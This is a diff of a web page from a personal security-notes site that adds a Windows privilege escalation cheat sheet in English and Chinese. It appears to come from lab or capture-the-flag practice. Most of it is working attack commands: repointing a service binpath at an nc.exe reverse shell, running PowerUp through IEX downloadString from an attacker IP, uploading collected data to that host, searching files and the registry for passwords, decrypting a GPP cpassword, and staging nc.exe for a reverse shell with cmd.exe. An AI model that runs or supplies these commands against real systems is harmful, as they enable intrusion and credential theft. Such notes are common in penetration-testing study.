@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Privilege_Escalation/Linux.html">Privilege Escalation</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Privilege_Escalation/Windows.html">Windows</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:19 AM        </span>
+            February 16, 2021 at 12:20 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/100_Privilege_Escalation/030_Windows.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,398 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Privilege_Escalation_Windows">Privilege Escalation Windows</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Privilege_Escalation_Windows">Privilege Escalation Windows</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>PrivilegeEscalation</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+</li>
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Windows_services">Windows services</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Service_Control">Service Control</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_sc">sc</a></p>
+</li>
+<li>
+<p><a href="#page_Net">Net</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Permission">Permission</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Accesschk">Accesschk</a></p>
+</li>
+<li>
+<p><a href="#page_cacls">cacls</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_PsExec">PsExec</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_JuicyPotato"><a href="https://github.com/ohpe/juicy-potato.git" class="Link--external" rel="noopener noreferrer">JuicyPotato</a></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Information_Gathering">Information Gathering</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Scripts">Scripts</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_PowerSploitPrivesc">PowerSploit/Privesc</a></p>
+</li>
+<li>
+<p><a href="#page_Windows_Management_Instrumentation_Command_Line">Windows Management Instrumentation Command-Line</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Manual">Manual</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_OS">OS</a></p>
+</li>
+<li>
+<p><a href="#page_users_and_permissions">users and permissions</a></p>
+</li>
+<li>
+<p><a href="#page_network_interfaces_routing_table_firewall">network interfaces &amp; routing table &amp; firewall</a></p>
+</li>
+<li>
+<p><a href="#page_scheduled_tasks,_running_processes,_started_services_and_installed_drivers.">scheduled tasks, running processes, started services and installed drivers.</a></p>
+</li>
+<li>
+<p><a href="#page_last">last</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Privilege_Escalation">Privilege Escalation</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_kernel_lou_dong">kernel 漏洞</a></p>
+</li>
+<li>
+<p><a href="#page_sysprep_Unattend">sysprep / Unattend</a></p>
+</li>
+<li>
+<p><a href="#page_Groups.xml_Group_Policy_Preference_saved_passwords">Groups.xml - Group Policy Preference saved passwords</a></p>
+</li>
+<li>
+<p><a href="#page_AlwaysInstallElevated">AlwaysInstallElevated</a></p>
+</li>
+<li>
+<p><a href="#page_DLL">DLL</a></p>
+</li>
+<li>
+<p><a href="#page_Command_Injection">Command Injection</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_pingback_check">pingback check</a></p>
+</li>
+<li>
+<p><a href="#page_nc">nc</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>PrivilegeEscalation</code></h6>
+<h1 id="page_Reference">Reference</h1>
+<ul>
+<li>
+<a href="http://www.fuzzysecurity.com/tutorials/16.html" class="Link--external" rel="noopener noreferrer">🌟Windows 提權 | FuzzySecurity - Windows Privilege Escalation Fundamentals</a>
+</li>
+<li>
+<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester" class="Link--external" rel="noopener noreferrer">Windows explotion suggester &amp; compiled exp</a>
+</li>
+<li>
+<a href="https://toshellandback.com/2015/11/24/ms-priv-esc/" class="Link--external" rel="noopener noreferrer">Windows Privilege Escalation Vectors</a> (<a href="https://www.freebuf.com/vuls/87463.html" class="Link--external" rel="noopener noreferrer">中文</a>)</li>
+<li>
+<a href="https://github.com/pentestmonkey/windows-privesc-check" class="Link--external" rel="noopener noreferrer">pentestmonkey/windows-privesc-check</a>
+</li>
+<li>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" class="Link--external" rel="noopener noreferrer">PayloadsAllTheThings ─ Windows - Privilege Escalation</a>
+</li>
+</ul>
+<h1 id="page_Tools">Tools</h1>
+<h2 id="page_Windows_services">Windows services</h2>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" class="Link--external" rel="noopener noreferrer">Microsoft’s Sysinternals Suite</a>
+第一次用 Sysinternal 的工具都會跳出 GUI 同意使用者條款，可以加入 <code>/accepteula</code> 參數略過這個步驟。</p>
+<ul>
+<li>
+<h3 id="page_Service_Control">Service Control</h3>
+<ul>
+<li>
+<h4 id="page_sc">sc</h4>
+</li>
+</ul>
+<p>sc can query, configure and manage windows services.</p>
+<pre><code>C:\&gt; sc qc {{Service name: Spooler}}
+C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;
+C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+</code></pre>
+<ul>
+<li>
+<h4 id="page_Net">Net</h4>
+</li>
+</ul>
+<pre><code>C:\&gt; net start upnphost
+</code></pre>
+</li>
+<li>
+<h3 id="page_Permission">Permission</h3>
+<p><img src="https://i.imgur.com/zd4Yjur.png" alt="" /></p>
+<ul>
+<li>
+<h4 id="page_Accesschk">Accesschk</h4>
+</li>
+</ul>
+<p>A tool in Sysinternals Suite</p>
+<pre><code>-u Suppress errors.
+-c Name is a Windows Service
+-v Verbose (includes Windows Vista Integrity Level).
+-w Show only objects that have write access.
+-d Only process directories or top level key.
+-s Recurse.
+
+C:\&gt; accesschk.exe -ucqv {{Service name: Spooler}}
+C:\&gt; accesschk.exe -ucqv * # see all the permissions
+
+# &quot;Authenticated Users&quot;, &quot;Power Users&quot; etc your user group
+C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+
+# Find all weak folder permissions per drive.
+C:\&gt; accesschk.exe -uwdqs Users c:\
+C:\&gt; accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\
+
+# Find all weak file permissions per drive.
+C:\&gt; accesschk.exe -uwqs Users c:\*.*
+C:\&gt; accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
+</code></pre>
+<ul>
+<li>
+<h4 id="page_cacls">cacls</h4>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_PsExec">PsExec</h3>
+<p>拿到某個帳號的權限(測試用)
+用高權限的 shell 執行</p>
+<pre><code>.\PsExec64.exe -i -u &quot;nt authority\local service&quot; cmd.exe
+</code></pre>
+<h2 id="page_JuicyPotato"><a href="https://github.com/ohpe/juicy-potato.git" class="Link--external" rel="noopener noreferrer">JuicyPotato</a></h2>
+<p><code>whoami /priv</code> have <code>SeImpersonate</code> and/or <code>SeAssignPrimaryToken</code> enable</p>
+<blockquote>
+<p>Windows Server 2019 is not affected by this vulnerability.
+Other versions of Windows (Server 2008R2, Server 2012, Server 2012 R2, Server 2016) are affected.</p>
+</blockquote>
+<h1 id="page_Information_Gathering">Information Gathering</h1>
+<h2 id="page_Scripts">Scripts</h2>
+<h3 id="page_PowerSploitPrivesc">PowerSploit/Privesc</h3>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" class="Link--external" rel="noopener noreferrer">GitHub</a></p>
+<pre><code>cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
+PS C:\Windows\system32&gt; IEX(New-Object Net.WebClient).downloadString(&quot;http://10.10.14.42/PowerUp.ps1&quot;)                   
+PS C:\Windows\system32&gt; Invoke-AllChecks                                   
+</code></pre>
+<h3 id="page_Windows_Management_Instrumentation_Command_Line">Windows Management Instrumentation Command-Line</h3>
+<pre><code>Invoke-WebRequest -Uri &quot;http://10.10.14.42/wmic_info.bat&quot; -OutFile wmic_info.bat
+.\wmic_info.bat
+Invoke-WebRequest -uri &quot;http://10.10.14.42/out.html&quot; -Method Put -Infile &quot;.\out.html&quot; -ContentType 'text/plain' 
+</code></pre>
+<h2 id="page_Manual">Manual</h2>
+<h3 id="page_OS">OS</h3>
+<pre><code>C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
+</code></pre>
+<h3 id="page_users_and_permissions">users and permissions</h3>
+<pre><code>C:\Windows\system32&gt; hostname
+C:\Windows\system32&gt; whoami
+
+C:\Windows\system32&gt; net users
+C:\Windows\system32&gt; net user {{username}}
+
+# list of administrators
+C:\Windows\system32&gt; net localgroup administrators
+</code></pre>
+<h3 id="page_network_interfaces_routing_table_firewall">network interfaces &amp; routing table &amp; firewall</h3>
+<pre><code>C:\Windows\system32&gt; ipconfig /all
+C:\Windows\system32&gt; route print
+C:\Windows\system32&gt; arp -A
+
+C:\Windows\system32&gt; netstat -ano
+
+C:\Windows\system32&gt; netsh firewall show state
+C:\Windows\system32&gt; netsh firewall show config
+</code></pre>
+<h3 id="page_scheduled_tasks,_running_processes,_started_services_and_installed_drivers.">scheduled tasks, running processes, started services and installed drivers.</h3>
+<pre><code>C:\Windows\system32&gt; schtasks /query /fo LIST /v # scheduled tasks
+C:\Windows\system32&gt; tasklist /SVC               # running processes
+C:\Windows\system32&gt; net start                   # started services
+C:\Windows\system32&gt; DRIVERQUERY                 # installed drivers
+</code></pre>
+<h3 id="page_last">last</h3>
+<pre><code># The command below will search the file system for file names containing certain keywords.
+# You can specify as many keywords as you wish.
+C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*
+
+# Search certain file types for a keyword, this can generate a lot of output.
+C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt
+
+# Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.
+C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s
+C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s
+</code></pre>
+<h1 id="page_Privilege_Escalation">Privilege Escalation</h1>
+<h2 id="page_kernel_lou_dong">kernel 漏洞</h2>
+<pre><code>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;
+</code></pre>
+<ul>
+<li>KiTrap0D (KB979682)</li>
+<li>MS11-011 (KB2393802)</li>
+<li>MS10-059 (KB982799)</li>
+<li>MS10-021 (KB979683)</li>
+<li>MS11-080 (KB2592799)</li>
+</ul>
+<h2 id="page_sysprep_Unattend">sysprep / Unattend</h2>
+<pre><code>c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+</code></pre>
+<pre><code># This is a sample from sysprep.inf with clear-text credentials.
+
+[GuiUnattended]
+OEMSkipRegional=1
+OemSkipWelcome=1
+AdminPassword=s3cr3tp4ssw0rd
+TimeZone=20
+
+# This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not
+encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.
+
+&lt;LocalAccounts&gt;
+    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;
+        &lt;Password&gt;
+            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+            &lt;PlainText&gt;false&lt;/PlainText&gt;
+        &lt;/Password&gt;
+        &lt;Description&gt;Local Administrator&lt;/Description&gt;
+        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
+        &lt;Group&gt;Administrators&lt;/Group&gt;
+        &lt;Name&gt;Administrator&lt;/Name&gt;
+    &lt;/LocalAccount&gt;
+&lt;/LocalAccounts&gt;
+
+# Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.
+
+&lt;AutoLogon&gt;
+    &lt;Password&gt;
+        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+        &lt;PlainText&gt;false&lt;/PlainText&gt;
+    &lt;/Password&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Username&gt;Administrator&lt;/Username&gt;
+&lt;/AutoLogon&gt;
+</code></pre>
+<h2 id="page_Groups.xml_Group_Policy_Preference_saved_passwords">Groups.xml - Group Policy Preference saved passwords</h2>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be" class="Link--external" rel="noopener noreferrer">The AES Key</a></p>
+<pre><code> 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
+ f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
+</code></pre>
+<pre><code>PS C:\Programdata&gt; cmd.exe /c &quot;dir /s /b | findstr Groups.xml&quot;
+C:\Programdata\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+
+PS C:\Programdata&gt; Get-Content &quot;C:\Programdata\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml&quot;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
+&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator&quot; image=&quot;2&quot; changed=&quot;2019-01-28 23:12:48&quot; uid=&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot; userContext=&quot;0&quot; removePolicy=&quot;0&quot; policyApplied=&quot;1&quot;&gt;
+&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;Administrator&quot;&gt;&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;
+</code></pre>
+<pre><code>python Gpprefdecrypt.py CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+MyUnclesAreMarioAndLuigi!!1!
+</code></pre>
+<blockquote>
+<p>In addition to Groups.xml several other policy preference files can have the optional “cPassword” attribute set:
+Services\Services.xml: Element-Specific Attributes
+ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+Printers\Printers.xml: SharedPrinter Element
+Drives\Drives.xml: Element-Specific Attributes
+DataSources\DataSources.xml: Element-Specific Attributes</p>
+</blockquote>
+<h2 id="page_AlwaysInstallElevated">AlwaysInstallElevated</h2>
+<p><code>AlwaysInstallElevated</code> - 允許所有權限的使用者安裝 <code>*.msi</code> 成為 <code>NT AUTHORITY\SYSTEM</code>
+兩個值都要是<code>1</code></p>
+<pre><code>C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+</code></pre>
+<h2 id="page_DLL">DLL</h2>
+<p>DLL search order on 32-bit systems:</p>
+<ol>
+<li>The directory from which the application loaded</li>
+<li>32-bit System directory (C:\Windows\System32)</li>
+<li>16-bit System directory (C:\Windows\System)</li>
+<li>Windows directory (C:\Windows)</li>
+<li>The current working directory (CWD) - 如果是 Windows Service 會在 C:\Windows 中</li>
+<li>Directories in the PATH environment variable (system then user)</li>
+</ol>
+<pre><code>msfvenom -f DLL
+</code></pre>
+<h2 id="page_Command_Injection">Command Injection</h2>
+<h3 id="page_pingback_check">pingback check</h3>
+<ul>
+<li>generate pingback payload</li>
+</ul>
+<pre><code>$ echo &quot;ping -n 1 10.10.14.5&quot; | iconv -t utf-16le | base64 -w 0
+cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA#
+
+&gt; powershell -EncodedCommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA
+</code></pre>
+<ul>
+<li>ensure pingback</li>
+</ul>
+<pre><code>$ tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+18:01:08.824794 IP servmon.htb &gt; kali-workplace: ICMP echo request, id 1, seq 1, length 40
+18:01:08.824806 IP kali-workplace &gt; servmon.htb: ICMP echo reply, id 1, seq 1, length 40
+</code></pre>
+<h3 id="page_nc">nc</h3>
+<pre><code>$ mkdir www &amp;&amp; cd www
+$ cp /usr/share/windows-resources/binaries/nc.exe .
+$ python3 -m http.server 7001
+
+&gt; curl 10.10.14.5:7001/nc.exe &gt; nc.exe
+&gt; echo C:\Temp\nc.exe 10.10.14.5 7777 -e cmd.exe &gt; reverse.bat
+</code></pre>
+    </div>
 
         <nav>
         <ul class="Pager">
